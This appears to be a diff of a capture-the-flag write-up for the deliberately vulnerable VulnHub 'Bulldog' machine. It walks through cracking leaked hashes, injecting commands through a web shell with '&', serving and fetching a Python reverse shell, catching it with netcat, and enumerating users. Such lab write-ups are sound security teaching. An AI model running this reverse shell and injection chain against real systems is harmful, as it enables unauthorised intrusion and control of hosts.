@@ -96,7 +96,7 @@ And when trying to go to the "Web-Shell" link, what I get is:
 
 ![bulldog 3](./images/bulldog-3.png)
 
-Meaning that i must authenticate (probably happens in the /admin/ directory found by gobuster) in order to access this page.
+Meaning that I must authenticate (probably happens in the /admin/ directory found by gobuster) in order to access this page.
 
 When viewing the /dev/ page source, I find the following information commented out:
 
@@ -112,7 +112,7 @@ Back End: nick@bulldogindustries.com<br><br><!--ddf45997a7e18a25ad5f5cf222da6481
 Database: sarah@bulldogindustries.com<br><!--d8b8dd5e7f000b8dea26ef8428caf38c04466b3e-->
 ```
 
-So i copy all these hashes into a file named 'hashes.txt', and run:
+So I copy all these hashes into a file named 'hashes.txt', and run:
 ```bash
 ┌──(j㉿kali)-[~/Desktop/vulnhub/bulldog-1]
 └─$ sudo hashcat -m 100 -a 0 -o cracked_hashes.txt hashes.txt /home/j/Desktop/wordlists/SecLists/rockyou.txt
@@ -135,7 +135,7 @@ I proceed to log-in with Username 'sarah' and Password 'bulldoglover'. After tha
 
 ![bulldog 5](./images/bulldog-5.png)
 
-I seem to be able to run only the commands allowed, when i try to ping back my host machine, what i get is:
+I seem to be able to run only the commands allowed, when I try to ping back my host machine, what I get is:
 
 ![bulldog 6](./images/bulldog-6.png)
 
@@ -147,21 +147,113 @@ But there is another way, using and ampersand, so, running "pwd & whoami":
 
 ![bulldog 8](./images/bulldog-8.png)
 
-And I get the info that the user serving the page is 'django', and also that the string sent is not clean enough, allowing for the ampersand to pass. So i proceed to plan a reverse shell. I check to see if the machine has php, by running
+And I get the info that the user serving the page is 'django', and also that the string sent is not clean enough, allowing for the ampersand to pass. So I proceed to plan a reverse shell. I check to see if the machine has php, by running
 
 ```bash
 pwd& which php
 ```
 
-But the server returns status 500, which I think means that it doesn't have php installed. So i run:
+But the server returns status 500, which I think means that it doesn't have php installed. So I run:
 
 ```bash
-pwd& which python3
+pwd& which python
 ```
 
-And it returns the path to python3, which has a one-liner for reverse shell. So I run:
+And it returns the path to python, which can be used for a reverse shell. But it shouldn't be a one-line reverse shell because the input doesn't allow it, so I must create a revshell.py on my machine, that reads:
+
+```python
+┌──(j㉿kali)-[~/Desktop/TOOLS]
+└─$ cat revshell.py
+import socket,os,pty
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("192.168.56.1",4444))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+pty.spawn("/bin/sh")
+```
+
+And serve it on through python's simpleHTTPserver and download it through wget on the victim machine, so, on my local machine:
 
 ```bash
+┌──(j㉿kali)-[~/Desktop/TOOLS]
+└─$ python3 -m http.server 9000 --bind 192.168.56.1
+Serving HTTP on 192.168.56.1 port 9000 (http://192.168.56.1:9000/) ...
+```
+
+And run the following on the '/dev/shell':
+
+```bash
+pwd& wget 192.168.56.1:9000/revshell.py
+```
+
+Now i listen to get the reverse shell on my local machine:
+
+```bash
+┌──(j㉿kali)-[~/Desktop/vulnhub/bulldog-1]
+└─$ nc -s 192.168.56.1 -lnvp 4444
+listening on [192.168.56.1] 4444 ...
+```
+
+and run the following on '/dev/shell':
+
+```bash
+pwd& python revshell.py
+```
+
+And then I receive on my host machine:
+
+```bash
+┌──(j㉿kali)-[~/Desktop/vulnhub/bulldog-1]
+└─$ nc -s 192.168.56.1 -lnvp 4444
+listening on [192.168.56.1] 4444 ...
+connect to [192.168.56.1] from (UNKNOWN) [192.168.56.117] 37298
+$ 
+```
+
+So, just to make the terminal look better, I run the following on my reverse shell:
 
 ```
- 
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+python -c 'import pty; pty.spawn("/bin/bash")'
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+bash: /root/.bashrc: Permission denied
+django@bulldog:/home/django/bulldog$ 
+```
+
+I snoop around on the /home folder, it has three users: /root, /bulldogadmin and /django, I'm currently user 'django'. /bulldogadmin is accessible, and when I list its files:
+
+```bash
+django@bulldog:/home/bulldogadmin$ ls -la
+ls -la
+total 40
+drwxr-xr-x 5 bulldogadmin bulldogadmin 4096 Sep 21  2017 .
+drwxr-xr-x 4 root         root         4096 Aug 24  2017 ..
+-rw-r--r-- 1 bulldogadmin bulldogadmin  220 Aug 24  2017 .bash_logout
+-rw-r--r-- 1 bulldogadmin bulldogadmin 3771 Aug 24  2017 .bashrc
+drwx------ 2 bulldogadmin bulldogadmin 4096 Aug 24  2017 .cache
+drwxrwxr-x 2 bulldogadmin bulldogadmin 4096 Sep 21  2017 .hiddenadmindirectory
+drwxrwxr-x 2 bulldogadmin bulldogadmin 4096 Aug 25  2017 .nano
+-rw-r--r-- 1 bulldogadmin bulldogadmin  655 Aug 24  2017 .profile
+-rw-rw-r-- 1 bulldogadmin bulldogadmin   66 Aug 25  2017 .selected_editor
+-rw-r--r-- 1 bulldogadmin bulldogadmin    0 Aug 24  2017 .sudo_as_admin_successful
+-rw-rw-r-- 1 bulldogadmin bulldogadmin  217 Aug 24  2017 .wget-hsts
+```
+
+I find the .hiddenadmindirectory, that is also accessible. There is file 'note' inside of it that reads:
+```bash
+django@bulldog:/home/bulldogadmin/.hiddenadmindirectory$ cat note
+cat note
+Nick,
+
+I'm working on the backend permission stuff. Listen, it's super prototype but I think it's going to work out great. Literally run the app, give your account password, and it will determine if you should have access to that file or not! 
+
+It's great stuff! Once I'm finished with it, a hacker wouldn't even be able to reverse it! Keep in mind that it's still a prototype right now. I am about to get it working with the Django user account. I'm not sure how I'll implement it for the others. Maybe the webserver is the only one who needs to have root access sometimes?
+
+Let me know what you think of it!
+
+-Ashley
+```
+
